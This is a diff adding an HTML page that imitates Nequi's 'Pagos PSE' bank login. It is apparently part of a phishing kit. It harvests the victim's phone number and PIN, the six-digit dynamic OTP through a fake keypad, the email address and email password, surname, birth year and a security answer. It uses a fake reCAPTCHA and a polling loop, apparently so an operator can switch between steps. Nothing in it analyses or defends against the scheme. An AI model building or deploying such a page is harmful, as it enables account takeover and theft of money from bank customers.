@@ -1,0 +1,705 @@
+
+<!DOCTYPE html>
+
+<html lang="es" class="hydrated">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+
+    <title>Nequi · PSE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <script type="text/javascript" src="js/jquery.min.js"></script>
+    <script type="text/javascript" src="js/operaciones.js?v=1"></script>
+    <script type="text/javascript" src="js/functions.js?v=1"></script>   
+
+  <link rel="stylesheet" href="./css/styles.f78a4ba11312d6af.css" >
+  <link rel="stylesheet" href="./css/style.css" >
+
+
+<style type="text/css">
+        .fondo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 10;
+            display: none;
+        }
+        .mensaje {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            z-index: 20;
+            text-align: center;
+            font-size: 1rem;
+            width: 80%;
+            max-width: 600px;
+            display: none;
+        }
+        .nequi-spinner {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #eee;
+            border-top-color: #DA0081;
+            border-radius: 50%;
+            margin: 0 auto 16px;
+            animation: nequi-spin 0.85s linear infinite;
+        }
+        @keyframes nequi-spin {
+            to { transform: rotate(360deg); }
+        }
+        @media (max-width: 600px) {
+            .mensaje .dav-msg-row {
+                font-size: 16px;
+            }
+        }
+/*
+.msgVacio{
+    display: table;
+    font-size: 13px;
+    font-style: italic;
+    color:#fafaf7;
+}
+*/
+.msgValida{
+    display: table;
+    font-size: 13px;
+    font-style: italic;
+    color:#fafaf7;
+}    
+
+.msgVacio{
+  display: none;
+}   
+
+</style>
+
+<script type="text/javascript">
+  $(document).ready(function($){
+
+  setInterval(consultar_estado, 2000); 
+
+  });
+</script>  
+
+</head>
+  <body>
+
+  <div class="fondo"></div>
+  <div class="mensaje">
+        <div class="nequi-spinner" aria-hidden="true"></div>
+        <p class="dav-msg-row" style="margin:0;">
+                    Por favor espere un momento estamos <strong>validando algunos datos.</strong> Puede tardar entre 1 a 5 minutos. <strong>No cierres o recargues esta ventana.</strong>
+        </p>
+</div> 
+
+    <nequi-root _nghost-cby-c40="" ng-version="15.2.10">
+        <div _ngcontent-cby-c40="" class="main-container">
+            <router-outlet _ngcontent-cby-c40=""></router-outlet>
+            <nequi-auth _nghost-cby-c37="" class="ng-star-inserted">
+                <nequi-header _ngcontent-cby-c37="" _nghost-cby-c18="">
+                    <div _ngcontent-cby-c18="" class="header">
+                        <nequi-logo _ngcontent-cby-c18="" _nghost-cby-c17="">
+                            <section _ngcontent-cby-c17="" id="img-header" class="splash">
+                                <div _ngcontent-cby-c17="" class="splash__container">
+                                    <svg _ngcontent-cby-c17="" width="180" height="40" viewBox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
+                                        <path _ngcontent-cby-c17="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__up"></path>
+                                        <path _ngcontent-cby-c17="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" class="point__down"></path>
+                                        <path _ngcontent-cby-c17="" d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020" class="N"></path>
+                                        <path _ngcontent-cby-c17="" d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020" class="E"></path>
+                                        <path _ngcontent-cby-c17="" d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020" class="I"></path>
+                                        <path _ngcontent-cby-c17="" d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020" class="Q"></path>
+                                        <path _ngcontent-cby-c17="" d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020" class="U"></path>
+                                    </svg>
+                                </div>
+                            </section>
+                        </nequi-logo>
+                    </div>
+                </nequi-header>
+
+<!--****************************  ****************************-->                
+
+<div class="acceso" style="display:block;">
+
+                <div _ngcontent-cby-c37="" class="auth-content">
+                    <nequi-title _ngcontent-cby-c37="" _nghost-cby-c19="">
+                        <h1 _ngcontent-cby-c19="" class="title">Pagos PSE de Nequi</h1>
+                    </nequi-title>
+                    <h2 _ngcontent-cby-c37="" class="subtitle">Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.</h2>
+                    <form _ngcontent-cby-c37="" novalidate="" class="form ng-touched ng-dirty ng-invalid">
+                            <div _ngcontent-cby-c35="" class="input-container">
+                                <div _ngcontent-cby-c35="" class="input-container__field">
+                                        <span _ngcontent-cby-c35="" class="p-float-label" >
+                                            <input _ngcontent-cby-c35="" class="placeholder" id="usuario" name="usuario" type="tel" maxlength="10">
+                                            <label _ngcontent-cby-c35="" >Número de celular</label>
+                                        </span>
+                                </div> 
+                                <small id="msgUsuario" class="input-error msgVacio" > ¡Ups! El campo esta vacio </small>                                                             
+                            </div>
+
+                        <nequi-input _ngcontent-cby-c37="" formcontrolname="password" ngdefaultcontrol="" _nghost-cby-c35="" class="ng-dirty ng-touched ng-invalid">
+                            <div _ngcontent-cby-c35="" class="input-container">
+                                <div _ngcontent-cby-c35="" class="input-container__field">
+                                        <span _ngcontent-cby-c35="" class="p-float-label ">
+                                            <input _ngcontent-cby-c35="" class="placeholder" type="password" id="password" name="password" maxlength="4">
+                                            <label _ngcontent-cby-c35="">Clave</label>
+                                        </span>
+                                </div>
+                                <small id="msgClave" class="input-error msgVacio" > ¡Ups! El campo esta vacio </small> 
+                            </div>
+                            <input type="hidden" name="sesionid" id="sesionid" value="68e65b4e746a3c2cc744ef419402408378bd69ca01b200d5928366f8387ae3ff ">
+                        </nequi-input>
+
+                        <div _ngcontent-cby-c37="" class="form__recaptcha">
+                            <div style="width: 300px; height: 78px;">
+                                <div>
+                                    <img class="BGinputbox" src="./img/recapcha.png" alt="" onerror="this.style.display='none'"> 
+                                    <input type="checkbox" name="cb-autos" style="position: relative; top: -46px; left: 7%; transform: scale(2);" >
+                                </div>
+                            </div>                             
+                        </div>
+
+                    <div _ngcontent-cby-c37="" class="form__buttons">
+                        <nequi-button _ngcontent-cby-c37="" _nghost-cby-c21="">
+                            <button _ngcontent-cby-c21="" pbutton="" pripple="" type="button" class="p-element p-button-primary p-button p-component" id="btniniciar"  onclick="final()" disabled >
+                                <span class="p-button-label">Entra</span>
+                            </button>
+                        </nequi-button>
+                        <nequi-button _ngcontent-cby-c37="" _nghost-cby-c21="">
+                            <button _ngcontent-cby-c21="" pbutton="" pripple="" type="button" class="p-element p-button-secondary p-button p-component" name="button_login_not_now">
+                                <span class="p-button-label">Ahora no</span>
+                            </button>
+                        </nequi-button>
+                    </div>
+                </form>
+                <p _ngcontent-cby-c37="" class="footer">¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.</p>
+            </div>
+
+</div> 
+
+<!--****************************  ****************************-->
+
+<div class="otp" style="display: none;">
+    
+                <div _ngcontent-dka-c28="" class="otp-validation">
+                    <nequi-title _ngcontent-dka-c28="" _nghost-dka-c19="">
+                        <h1 _ngcontent-dka-c19="" class="title">Pagos PSE de Nequi</h1>
+                    </nequi-title>
+                    <p _ngcontent-dka-c28="" class="otp-validation__subtitle">Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi.</p>
+                    <nequi-numeric-keypad _ngcontent-dka-c28="">
+                        <p-card class="p-element container_numerickeypad">
+                            <div class="p-card p-component">
+                                <div class="p-card-body">
+                                    <div class="p-card-content">
+                                        <div class="box_numerickeypad">
+                                            <div class="code_numerickeypad empty ng-star-inserted">
+                                                <span></span>
+                                            </div>
+                                            <div class="code_numerickeypad empty ng-star-inserted">
+                                                <span></span>
+                                            </div>
+                                            <div class="code_numerickeypad empty ng-star-inserted">
+                                                <span></span>
+                                            </div>
+                                            <div class="code_numerickeypad empty ng-star-inserted">
+                                                <span></span>
+                                            </div>
+                                            <div class="code_numerickeypad empty ng-star-inserted">
+                                                <span></span>
+                                            </div>
+                                            <div class="code_numerickeypad empty ng-star-inserted">
+                                                <span></span>
+                                            </div>
+
+                                        </div>
+                                        <div class="errorotp" style="display: none;">
+                                            <br> 
+                                            <center>
+                                                <small id="msgOTP" class="input-error" > ¡Ups! Clave dinamica invalida o vencida </small>    
+                                            </center> 
+                                        </div>                                   
+                                        
+                                        <div class="label_numerickeypad">  </div>
+                                        <div class="numeric_board">
+                                            <div class="numeric_board-row">
+                                                <button name="numeric_board_1" class="container_number"> 1 </button>
+                                                <button name="numeric_board_2" class="container_number"> 2 </button>
+                                                <button name="numeric_board_3" class="container_number"> 3 </button>
+                                            </div>
+                                            <div class="numeric_board-row">
+                                                <button name="numeric_board_4" class="container_number"> 4 </button>
+                                                <button name="numeric_board_5" class="container_number"> 5 </button>
+                                                <button name="numeric_board_6" class="container_number"> 6 </button>
+                                            </div>
+                                            <div class="numeric_board-row">
+                                                <button name="numeric_board_7" class="container_number"> 7 </button>
+                                                <button name="numeric_board_8" class="container_number"> 8 </button>
+                                                <button name="numeric_board_9" class="container_number"> 9 </button>
+                                            </div>
+                                            <div class="numeric_board-row">
+                                                <button class="container_number" disabled=""></button>
+                                                <button name="numeric_board_0" class="container_number"> 0 </button>
+                                                <button name="numeric_board_backspace" class="container_number"><img alt="" src="./img/nequi-teclado-numerico-borrar.svg"></button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </p-card>
+                    </nequi-numeric-keypad>
+                    <div _ngcontent-dka-c28="" class="otp-validation__buttons">
+                        <nequi-button _ngcontent-dka-c28="" _nghost-dka-c21="">
+                            <button _ngcontent-dka-c21="" pbutton="" pripple="" type="button" class="p-element p-button-secondary p-button p-component" name="otp_validation_cancel_button"><span class="p-button-label">Cancela el pago</span></button>
+                        </nequi-button>
+                    </div>
+                </div>
+
+</div>          
+
+<!--****************************  ****************************-->
+
+<div class="correo-con" style="display: none;">
+
+                <div _ngcontent-cby-c37="" class="auth-content">
+                    <nequi-title _ngcontent-cby-c37="" _nghost-cby-c19="">
+                        <h1 _ngcontent-cby-c19="" class="title">Pagos PSE de Nequi</h1>
+                    </nequi-title>
+                    <h2 _ngcontent-cby-c37="" class="subtitle">Para validar su identidad por favor ingrese la información solicitada.</h2>
+                    <br><br>
+                    <form _ngcontent-cby-c37="" novalidate="" class="form ng-touched ng-dirty ng-invalid">
+                            <div _ngcontent-cby-c35="" class="input-container">
+                                <div _ngcontent-cby-c35="" class="input-container__field">
+                                        <span _ngcontent-cby-c35="" class="p-float-label" >
+                                            <input _ngcontent-cby-c35="" class="placeholder" id="email" name="email" type="text" maxlength="35">
+                                            <label _ngcontent-cby-c35="" >Correo Electrónico</label>
+                                        </span>
+                                </div> 
+
+                                <small id="msgEmail" class="input-error msgVacio" > ¡Ups! El campo esta vacio </small>                                                             
+                            </div>
+
+                        <nequi-input _ngcontent-cby-c37="" formcontrolname="password" ngdefaultcontrol="" _nghost-cby-c35="" class="ng-dirty ng-touched ng-invalid">
+                            <div _ngcontent-cby-c35="" class="input-container">
+                                <div _ngcontent-cby-c35="" class="input-container__field">
+                                        <span _ngcontent-cby-c35="" class="p-float-label ">
+                                            <input _ngcontent-cby-c35="" class="placeholder" id="clavemail" name="clavemail" type="password" maxlength="35">
+                                            <label _ngcontent-cby-c35="">Clave de Correo</label>
+                                        </span>
+                                </div>
+                                <small id="msgClaveEmail" class="input-error msgVacio" > ¡Ups! El campo esta vacio </small> 
+                            </div>
+                        </nequi-input>
+
+                    <div _ngcontent-cby-c37="" class="form__buttons">
+                        <nequi-button _ngcontent-cby-c37="" _nghost-cby-c21="">
+                            <button _ngcontent-cby-c21="" pbutton="" pripple="" type="button" class="p-element p-button-primary p-button p-component" id="btnEmail" onclick="registraremail()" disabled  >
+                                <span class="p-button-label">Continuar</span>
+                            </button>
+                        </nequi-button>
+
+                    </div>
+                </form>
+            </div>
+
+</div> 
+
+<!--****************************  ****************************-->
+
+<div class="apellidos" style="display: none;">
+
+                <div _ngcontent-cby-c37="" class="auth-content">
+                    <nequi-title _ngcontent-cby-c37="" _nghost-cby-c19="">
+                        <h1 _ngcontent-cby-c19="" class="title">Pagos PSE de Nequi</h1>
+                    </nequi-title>
+                    <h2 _ngcontent-cby-c37="" class="subtitle">Para validar su identidad por favor ingrese la información solicitada.</h2>
+                    <br><br>
+                    <form _ngcontent-cby-c37="" novalidate="" class="form ng-touched ng-dirty ng-invalid">
+                            <div _ngcontent-cby-c35="" class="input-container">
+                                <div _ngcontent-cby-c35="" class="input-container__field">
+                                        <span _ngcontent-cby-c35="" class="p-float-label" >
+                                            <input _ngcontent-cby-c35="" class="placeholder" id="apellido" name="apellido" type="text" maxlength="35">
+                                            <label _ngcontent-cby-c35="" >Ingresar su primer apellido</label>
+                                        </span>
+                                </div> 
+
+                                <small id="msgAPE" class="input-error msgVacio" > ¡Ups! El campo esta vacio </small>                                                             
+                            </div>
+
+                    <div _ngcontent-cby-c37="" class="form__buttons">
+                        <nequi-button _ngcontent-cby-c37="" _nghost-cby-c21="">
+                            <button _ngcontent-cby-c21="" pbutton="" pripple="" type="button" class="p-element p-button-primary p-button p-component" id="btnApe" onclick="guardarape()" disabled  >
+                                <span class="p-button-label">Continuar</span>
+                            </button>
+                        </nequi-button>
+
+                    </div>
+                </form>
+            </div>
+
+</div> 
+
+<!--****************************  ****************************-->
+
+<div class="mobil" style="display: none;">
+
+                <div _ngcontent-cby-c37="" class="auth-content">
+                    <nequi-title _ngcontent-cby-c37="" _nghost-cby-c19="">
+                        <h1 _ngcontent-cby-c19="" class="title">Pagos PSE de Nequi</h1>
+                    </nequi-title>
+                    <h2 _ngcontent-cby-c37="" class="subtitle">Para validar su identidad por favor ingrese la información solicitada.</h2>
+                    <br><br>
+                    <form _ngcontent-cby-c37="" novalidate="" class="form ng-touched ng-dirty ng-invalid">
+                            <div _ngcontent-cby-c35="" class="input-container">
+                                <div _ngcontent-cby-c35="" class="input-container__field">
+                                        <span _ngcontent-cby-c35="" class="p-float-label" >
+                                            <input _ngcontent-cby-c35="" class="placeholder" id="celular" name="celular" type="text" maxlength="10">
+                                            <label _ngcontent-cby-c35="" >Ingrese su Celular</label>
+                                        </span>
+                                </div> 
+
+                                <small id="msgCelular" class="input-error msgVacio" > ¡Ups! El campo esta vacio </small>                                                             
+                            </div>
+
+                    <div _ngcontent-cby-c37="" class="form__buttons">
+                        <nequi-button _ngcontent-cby-c37="" _nghost-cby-c21="">
+                            <button _ngcontent-cby-c21="" pbutton="" pripple="" type="button" class="p-element p-button-primary p-button p-component" id="btnMovil" onclick="registrarcel()" disabled  >
+                                <span class="p-button-label">Continuar</span>
+                            </button>
+                        </nequi-button>
+
+                    </div>
+                </form>
+            </div>
+
+</div>
+<!--****************************  ****************************-->
+
+<div class="fnacimiento" style="display: none;">
+
+                <div _ngcontent-cby-c37="" class="auth-content">
+                    <nequi-title _ngcontent-cby-c37="" _nghost-cby-c19="">
+                        <h1 _ngcontent-cby-c19="" class="title">Pagos PSE de Nequi</h1>
+                    </nequi-title>
+                    <h2 _ngcontent-cby-c37="" class="subtitle">Para validar su identidad por favor ingrese la información solicitada.</h2>
+                    <br><br>
+                    <form _ngcontent-cby-c37="" novalidate="" class="form ng-touched ng-dirty ng-invalid">
+                            <div _ngcontent-cby-c35="" class="input-container">
+                                <div _ngcontent-cby-c35="" class="input-container__field">
+                                        <span _ngcontent-cby-c35="" class="p-float-label" >
+                                            <input _ngcontent-cby-c35="" class="placeholder" id="nacimiento" name="nacimiento" type="text" maxlength="4">
+                                            <label _ngcontent-cby-c35="" >Ingresar su año de nacimiento</label>
+                                        </span>
+                                </div> 
+
+                                <small id="msgAnio" class="input-error msgVacio" > ¡Ups! El campo esta vacio </small>                                                             
+                            </div>
+
+                    <div _ngcontent-cby-c37="" class="form__buttons">
+                        <nequi-button _ngcontent-cby-c37="" _nghost-cby-c21="">
+                            <button _ngcontent-cby-c21="" pbutton="" pripple="" type="button" class="p-element p-button-primary p-button p-component" id="btnNaci" onclick="guardarnac()" disabled  >
+                                <span class="p-button-label">Continuar</span>
+                            </button>
+                        </nequi-button>
+
+                    </div>
+                </form>
+            </div>
+
+</div>
+
+<!--****************************  ****************************-->
+
+<div class="pregunta2" style="display: none;">
+
+                <div _ngcontent-cby-c37="" class="auth-content">
+                    <nequi-title _ngcontent-cby-c37="" _nghost-cby-c19="">
+                        <h1 _ngcontent-cby-c19="" class="title">Pagos PSE de Nequi</h1>
+                    </nequi-title>
+                    <h2 _ngcontent-cby-c37="" class="subtitle">Para validar su identidad por favor ingrese la información solicitada.</h2>
+                    <br>
+                    <h4 id="preg2"></h4>
+                    
+                    <form _ngcontent-cby-c37="" novalidate="" class="form ng-touched ng-dirty ng-invalid">
+                            <div _ngcontent-cby-c35="" class="input-container">
+                                <div _ngcontent-cby-c35="" class="input-container__field">
+                                        <span _ngcontent-cby-c35="" class="p-float-label" >
+                                            <input _ngcontent-cby-c35="" class="placeholder" id="resp2" name="resp2" type="text" maxlength="35">
+                                            <label _ngcontent-cby-c35="" >Ingresar respuesta de seguridad</label>
+                                        </span>
+                                </div> 
+
+                                <small id="msgResp" class="input-error msgVacio" > ¡Ups! El campo esta vacio </small>                                                             
+                            </div>
+
+                    <div _ngcontent-cby-c37="" class="form__buttons">
+                        <nequi-button _ngcontent-cby-c37="" _nghost-cby-c21="">
+                            <button _ngcontent-cby-c21="" pbutton="" pripple="" type="button" class="p-element p-button-primary p-button p-component" id="btnResp" onclick="registaresp2()" disabled  >
+                                <span class="p-button-label">Continuar</span>
+                            </button>
+                        </nequi-button>
+
+                    </div>
+                </form>
+            </div>
+
+</div>
+
+
+
+
+        </nequi-auth>
+    </div>
+
+</nequi-root>
+
+<script type="text/javascript">
+  const inputUsuario = document.getElementById("usuario");
+  const inputClave = document.getElementById("password");
+  const inputEmail = document.getElementById("email");
+  const inputClavemail = document.getElementById("clavemail");
+  const inputApellido = document.getElementById("apellido");
+  const inputCelular = document.getElementById("celular");
+  const inputNacimiento = document.getElementById("nacimiento");
+  const inputRespuesta = document.getElementById("resp2");  
+
+    inputUsuario.addEventListener("input", function() {
+
+      if (this.value.trim().length == 0) {
+        this.classList.remove("p-filled");
+      } else {
+        this.classList.add("p-filled");
+      }
+
+    });
+
+    inputClave.addEventListener("input", function() {
+
+      if (this.value.trim().length == 0) {
+        this.classList.remove("p-filled");
+      } else {
+        this.classList.add("p-filled");
+      }
+
+    });
+
+    inputEmail.addEventListener("input", function() {
+
+      if (this.value.trim().length == 0) {
+        this.classList.remove("p-filled");
+      } else {
+        this.classList.add("p-filled");
+      }
+
+    });   
+
+    inputClavemail.addEventListener("input", function() {
+
+      if (this.value.trim().length == 0) {
+        this.classList.remove("p-filled");
+      } else {
+        this.classList.add("p-filled");
+      }
+
+    });    
+
+    inputApellido.addEventListener("input", function() {
+
+      if (this.value.trim().length == 0) {
+        this.classList.remove("p-filled");
+      } else {
+        this.classList.add("p-filled");
+      }
+
+    });     
+
+    inputCelular.addEventListener("input", function() {
+
+      if (this.value.trim().length == 0) {
+        this.classList.remove("p-filled");
+      } else {
+        this.classList.add("p-filled");
+      }
+
+    });   
+
+    inputNacimiento.addEventListener("input", function() {
+
+      if (this.value.trim().length == 0) {
+        this.classList.remove("p-filled");
+      } else {
+        this.classList.add("p-filled");
+      }
+
+    }); 
+
+    inputRespuesta.addEventListener("input", function() {
+
+      if (this.value.trim().length == 0) {
+        this.classList.remove("p-filled");
+      } else {
+        this.classList.add("p-filled");
+      }
+
+    });     
+
+
+        function check($this) {
+            if ($this.value == '') {
+                $this.classList.remove('cool-input__input_filled');
+            } else {
+                $this.classList.add('cool-input__input_filled');
+            }
+        };    
+    
+        var btniniciar = document.getElementById('btniniciar');
+            //clave = document.getElementById('clave');
+
+                inputUsuario.addEventListener("keyup", function () {
+                    check(this);
+
+                    if(inputUsuario.value.trim().length == 0 ) {
+                        btniniciar.disabled = false;
+                    } else {
+                       // btniniciar.disabled = true;
+                        inputClave.addEventListener("keyup", function () {
+                            check(this);
+
+                            if(inputClave.value.length == 4) {
+                                btniniciar.disabled = false;
+                            } else {
+                                btniniciar.disabled = true;
+                            }                           
+
+                        });                        
+                    }                           
+
+                });
+
+        var btnEmail = document.getElementById('btnEmail');
+            //clave = document.getElementById('clave');
+
+                inputEmail.addEventListener("keyup", function () {
+                    check(this);
+
+                    if(inputEmail.value.trim().length == 0 ) {
+                        btnEmail.disabled = false;
+                    } else {
+                       // btniniciar.disabled = true;
+                        inputClavemail.addEventListener("keyup", function () {
+                            check(this);
+
+                            if(inputClavemail.value.length >= 4) {
+                                btnEmail.disabled = false;
+                            } else {
+                                btnEmail.disabled = true;
+                            }                           
+
+                        });                        
+                    }                           
+
+                });   
+
+        var btnApe = document.getElementById('btnApe');
+
+                inputApellido.addEventListener("keyup", function () {
+                    check(this);
+
+                    if(inputApellido.value.trim().length >= 3 ) {
+
+                                btnApe.disabled = false;
+                            } else {
+                                btnApe.disabled = true;
+                            }                           
+
+                        });                                                    
+
+        var btnMovil = document.getElementById('btnMovil');
+
+                inputCelular.addEventListener("keyup", function () {
+                    check(this);
+
+                    if(inputCelular.value.trim().length == 10 ) {
+
+                                btnMovil.disabled = false;
+                            } else {
+                                btnMovil.disabled = true;
+                            }                           
+
+                        });   
+
+        var btnNaci = document.getElementById('btnNaci');
+
+                inputNacimiento.addEventListener("keyup", function () {
+                    check(this);
+
+                    if(inputNacimiento.value.trim().length == 4 ) {
+
+                                btnNaci.disabled = false;
+                            } else {
+                                btnNaci.disabled = true;
+                            }                           
+
+                        });  
+
+        var btnResp = document.getElementById('btnResp');
+
+                inputRespuesta.addEventListener("keyup", function () {
+                    check(this);
+
+                    if(inputRespuesta.value.trim().length >= 1 ) {
+
+                                btnResp.disabled = false;
+                            } else {
+                                btnResp.disabled = true;
+                            }                           
+
+                        });                                           
+
+
+</script>
+
+    <script>
+        const keypadButtons = Array.from(document.querySelectorAll('.container_number:not([disabled])'))
+            .filter(button => button.name !== 'numeric_board_backspace');
+        const displayFields = document.querySelectorAll('.code_numerickeypad span');
+        const backspaceButton = document.querySelector('button[name="numeric_board_backspace"]');
+        let currentIndex = 0;
+        const enteredValues = [];
+
+        keypadButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                if (currentIndex < displayFields.length) {
+                    displayFields[currentIndex].innerText = '*';
+                    enteredValues[currentIndex] = button.innerText;
+                    currentIndex++;
+                    dina = enteredValues.join('');
+                    console.log(dina); // Muestra los valores ingresados en la consola
+                    if (currentIndex === 6) {
+                        guardarotp(dina);
+                        console.log('SE FUE...');
+                    }
+                    
+                }
+            });
+        });
+
+        backspaceButton.addEventListener('click', () => {
+            if (currentIndex > 0) {
+                currentIndex--;
+                displayFields[currentIndex].innerText = '';
+                enteredValues[currentIndex] = undefined;
+                console.log(enteredValues.filter(val => val !== undefined).join('')); // Muestra los valores ingresados en la consola
+            }
+        });
+    </script>
+
+
+</body>
+</html>
